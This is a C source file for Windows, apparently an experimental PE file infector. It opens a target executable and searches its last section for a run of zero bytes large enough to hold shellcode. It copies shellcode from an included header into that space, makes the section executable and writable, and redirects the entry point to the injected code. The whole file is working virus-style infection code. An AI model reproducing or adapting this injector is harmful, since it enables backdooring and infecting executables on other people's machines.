#include <stdio.h>
#include <math.h>
#include <string.h>
#include <stdbool.h>
#include <Windows.h>
#include "exe.h"
#include "shellcode.h"

#pragma warning(disable : 4996)

#define ERROR -1
#define SUCCESS 0

#define INFECTED_PATH "C:\\Users\\User\\source\\repos\\playground\\msgBox.exe"


PVOID get_code_cave_address(EXE_file* infected, PDWORD result_out, DWORD shell_code_size)
{
    int gap = 0;
    DWORD address = 0;
    BYTE current_byte = 0;
    for (address = infected->last_section->PointerToRawData; address < infected->file_size; address++)
    {
        current_byte = *(infected->mapped_handle + address);
        if (current_byte == 0x00)
            gap++;
        else gap = 0;
        
        if (gap >= shell_code_size)
            break;
    }

    *result_out = gap > 0 && gap < infected->last_section->SizeOfRawData ? SUCCESS : ERROR;
    // Calculate start of code_cave;
    return  address - gap + infected->mapped_handle + 1;

}

int main()
{
    // Restarting the infected file to original.
    CopyFileA("C:\\Users\\User\\source\\repos\\playground\\Debug\\msgBox.exe", INFECTED_PATH, FALSE);
    int result = SUCCESS;
    EXE_file* infected = NULL;
    HANDLE mapping_handle = { 0 };
    PVOID codecave_address = 0;
    int shellcode_size = 0;
    DWORD new_entery_point = 0;

    infected = malloc(sizeof(EXE_file));
    if (infected == NULL)
    {
        result = ERROR;
        goto end;
    }

    // Open the existing file, or if the file does not exist,
    // create a new file.

    infected->handle = CreateFileA(INFECTED_PATH, // open Two.txt
        FILE_APPEND_DATA | GENERIC_READ | GENERIC_WRITE,         // open for writing
        FILE_SHARE_READ,          // allow multiple readers
        NULL,                     // no security
        OPEN_ALWAYS,              // open or create
        FILE_ATTRIBUTE_NORMAL,    // normal file
        NULL);                    // no attr. template
    
    if (infected->handle == INVALID_HANDLE_VALUE)
    {
        printf("Could not open infected file.");
        result = ERROR;
        goto end;
    }

    infected->file_size = GetFileSize(infected->handle, NULL);
    /*
    * Load the file to the ram.
    * Every change in the ram would cause change on the disk eather.
    */
    mapping_handle = CreateFileMapping(infected->handle, NULL, PAGE_READWRITE, 0, infected->file_size, NULL);
    infected->mapped_handle = (LPBYTE)MapViewOfFile(mapping_handle, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, infected->file_size);

    result = set_exe_headers(infected);
    if (result != SUCCESS)
        goto end;

    //unsigned long shell_code_ennnd = &shellcode_end;
    //unsigned long shell_code_first = &shellcode;
    //shellcode_size = (LONG)shell_code_ennnd - (LONG)shell_code_first;
    // 
    shellcode_size = get_shellcode_size();

    //shellcode_size = 60; // actually 54
    codecave_address = get_code_cave_address(infected, &result, shellcode_size);
    if (result == ERROR)
        goto end;
    
    memcpy((LPBYTE)codecave_address, (PCHAR)shellcode + 0x1070, shellcode_size);
    set_addrress_in_shellcode(infected, codecave_address, shellcode_size);

    infected->last_section->Misc.VirtualSize += shellcode_size;
    infected->last_section->Characteristics |= IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE;
    new_entery_point = (DWORD)codecave_address + infected->last_section->VirtualAddress - infected->last_section->PointerToRawData - (DWORD)infected->mapped_handle;
    infected->headers->OptionalHeader.AddressOfEntryPoint = new_entery_point;

end:
    if (infected != NULL)
    {
        CloseHandle(infected->handle);
        free(infected);
    }
    return result;
}
